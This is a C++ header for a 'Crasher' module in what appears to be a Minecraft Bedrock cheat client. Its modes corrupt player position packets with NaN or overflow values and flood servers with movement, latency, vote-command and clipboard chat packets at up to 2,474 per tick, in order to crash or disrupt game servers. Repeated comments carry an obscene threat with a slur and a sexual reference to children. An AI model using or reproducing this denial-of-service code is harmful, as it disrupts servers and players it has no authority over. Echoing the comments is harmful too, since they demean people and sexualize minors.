#pragma once
#include "Module.h"
class Crasher : public IModule {//Crashers by Founder don't touch, skid, steal, or else you watch gay furry porn and r into little boys
public:
	SettingEnum CrasherMode;
	int CrasherPPS = 1;

	Crasher() : IModule(0x0, Category::WORLD, "Crash Servers n stuff") {
	registerIntSetting("PPS", &CrasherPPS, 1, 1, 2474);
	registerEnumSetting("Method", &CrasherMode, 0);
	CrasherMode = (*new SettingEnum(this)) //Crashers by Founder don't touch, skid, steal, or else you watch gay furry porn and r into little boys
			.addEntry(EnumEntry("Realm", 0))
			.addEntry(EnumEntry("PacketStorm", 1))
		    .addEntry(EnumEntry("VoteSpam", 2))
		    .addEntry(EnumEntry("ClipboardSpam", 3))
			.addEntry(EnumEntry("Selfhit", 4))
			.addEntry(EnumEntry("BigBang", 5));
	}
	~Crasher(){};

	virtual const char* getModuleName() override { return ("Crasher"); }
	virtual void onSendPacket(C_Packet* packet) override {
		if (CrasherMode.selected == 0) {
			if (packet->isInstanceOf<PlayerAuthInputPacket>()) {
				PlayerAuthInputPacket* InputPacket = reinterpret_cast<PlayerAuthInputPacket*>(packet);
				InputPacket->pos.x = static_cast<float>(0xFFFFFFFF);
				InputPacket->pos.y = static_cast<float>(0xFFFFFFFF);
				InputPacket->pos.z = static_cast<float>(0xFFFFFFFF);
			} else if (packet->isInstanceOf<C_MovePlayerPacket>()) {
				C_MovePlayerPacket* movePacket = reinterpret_cast<C_MovePlayerPacket*>(packet);
				movePacket->Position.x = static_cast<float>(0xFFFFFFFF);
				movePacket->Position.y = static_cast<float>(0xFFFFFFFF);
				movePacket->Position.z = static_cast<float>(0xFFFFFFFF);
			}
		}
		if (CrasherMode.selected == 1 || CrasherMode.selected == 5) {
			if (packet->isInstanceOf<PlayerAuthInputPacket>()) {
				PlayerAuthInputPacket* InputPacket = reinterpret_cast<PlayerAuthInputPacket*>(packet);
				InputPacket->pos.x = NAN;
				InputPacket->pos.y = NAN;
				InputPacket->pos.z = NAN;
			} else if (packet->isInstanceOf<C_MovePlayerPacket>()) {
				C_MovePlayerPacket* movePacket = reinterpret_cast<C_MovePlayerPacket*>(packet);
				movePacket->Position.x = NAN;
				movePacket->Position.y = NAN;
				movePacket->Position.z = NAN;
				// Crashers by Founder don't touch, skid, steal, or else you watch gay furry porn and r into little boys
			}
		}
	}
	virtual void onEnable() override {
		if (g_Data.getLocalPlayer() == nullptr)
			setEnabled(false);
	}
	// Crashers by Founder don't touch, skid, steal, or else you watch gay furry porn and r into little boys
	virtual void onTick(C_GameMode* gm) override {
		if (g_Data.getLocalPlayer() == nullptr) {
			setEnabled(false);
			return;
		}
		C_TextPacket textPacket;
		C_MovePlayerPacket MovePlayerPacket(g_Data.getLocalPlayer(), g_Data.getLocalPlayer()->getPos()->add(vec3(1000.5f, 1000.5f, 1000.5f)));
		NetworkLatencyPacket NetworkPacket;
		NetworkPacket.timeStamp = 6;
		//C_SubChunkRequestPacket ChunkRequestPacket;
		//C_AnimatePacket AnimatePacket;
		//CommandRequestPacket CommandRequestPacket;
		//CommandRequestPacket.payload = std::string("FADEAWAY ON TOP");
		if (CrasherMode.selected == 1 || CrasherMode.selected == 5) {
			//g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&ChunkRequestPacket);
			for (int PacketStorm = 0; PacketStorm < CrasherPPS; PacketStorm++) {
				gm->player->causeFallDamage(0,0,0);
				g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&MovePlayerPacket);
				g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&NetworkPacket);
				//monke
				//g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&AnimatePacket);
				//g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&CommandRequestPacket);
			}
		}
		if (CrasherMode.selected == 2 || CrasherMode.selected == 5) {
			for (int VoteSpam = 0; VoteSpam < CrasherPPS; VoteSpam++) {
				textPacket.message.setText("./vote");
				textPacket.messageType = 3;
				textPacket.sourceName.setText(g_Data.getLocalPlayer()->getNameTag()->getText());
				textPacket.xboxUserId = std::to_string(g_Data.getLocalPlayer()->getUserId());
				g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&textPacket);
			}
		}
		if (CrasherMode.selected == 3 || CrasherMode.selected == 5) {
			for (int ChineseSpam = 0; ChineseSpam < CrasherPPS; ChineseSpam++) {
				textPacket.message.setText(Utils::getClipboardText());
				textPacket.sourceName.setText(g_Data.getLocalPlayer()->getNameTag()->getText());
				textPacket.xboxUserId = std::to_string(g_Data.getLocalPlayer()->getUserId());
				g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&textPacket);
			}
		}
		if (CrasherMode.selected == 4 || CrasherMode.selected == 5) {
			gm->player->swing();
			for (int AttackSpam = 0; AttackSpam < CrasherPPS; AttackSpam++) {
				g_Data.getCGameMode()->attack(gm->player);
			}
		}
	}
};